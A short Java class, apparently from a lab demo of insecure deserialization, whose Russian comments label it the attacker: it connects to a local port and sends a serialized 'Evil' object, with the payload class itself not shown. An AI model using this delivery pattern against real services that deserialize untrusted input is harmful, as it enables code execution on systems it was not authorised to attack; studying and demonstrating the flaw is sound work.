import java.io.*; import java.net.*;
// Атакующий: подключается и шлёт сериализованный Evil-объект.
public class Attacker {
    public static void main(String[] a) throws Exception {
        Socket s = new Socket("127.0.0.1", Integer.parseInt(a[0]));
        ObjectOutputStream out = new ObjectOutputStream(s.getOutputStream());
        out.writeObject(new Evil());
        out.flush(); Thread.sleep(400); s.close();
        System.out.println("[attacker] отправил сериализованный Evil на порт " + a[0]);
    }
}
